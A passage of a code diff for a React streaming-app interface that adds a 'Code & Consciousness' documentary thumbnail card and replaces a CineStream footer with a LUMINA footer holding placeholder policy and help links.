+              <div className="thumb-card-img" style={{ backgroundImage: `url('https://lh3.googleusercontent.com/aida-public/AB6AXuC5Oz1r8Ni3oG_0R0UjCUm89SgDQZSTKYf5LxLPxlbRVWKA2mfT6sjfyyFdQA7_hlHQs37Jdf9PCwE6yAlHyUCOJC2EiL8_E6mrDTisrMz1_Wj9XidmWMwwuij8NmJG_h0jJ7eRuMRWN86_12Cf4LAkPNufyN7RtsMoGhLQFYNrmsTZT-fBwrlC1JVf_avbqXPm0r4d7gycgp2_oNrkbFgIBnkYxfzXTy-cWnx1pMEvlhgi-lyUWXdCNKyiujDvbeWgOLguVyLrc9R9')` }} />
+              <div className="thumb-card-overlay">
+                <div className="card-label">DOCUMENTARY</div>
+                <div className="card-title">Code & Consciousness</div>
+              </div>
             </div>
           </div>
+        </section>
 
-        </main>
+      </main>
 
-        {/* FOOTER */}
-        <footer className="footer">
-          <div className="footer-text">CineStream Player v2.0</div>
-          <div className="footer-dots">
-            <div className="footer-dot active" />
-            <div className="footer-dot" />
-            <div className="footer-dot" />
-          </div>
-          <div className="footer-text">HD Quality</div>
-        </footer>
-
-      </div>
+      {/* FOOTER */}
+      <footer className="footer">
+        <div>
+          <div className="footer-logo">LUMINA</div>
+          <div className="footer-sub">© 2024 LUMINA STREAMS · VERSION 2.4.0</div>
+        </div>
+        <div className="footer-links">
+          <a href="#">Privacy Policy</a>
+          <a href="#">Terms of Service</a>
+          <a href="#">Help Center</a>
+        </div>
+      </footer>
     </>
   );
 }
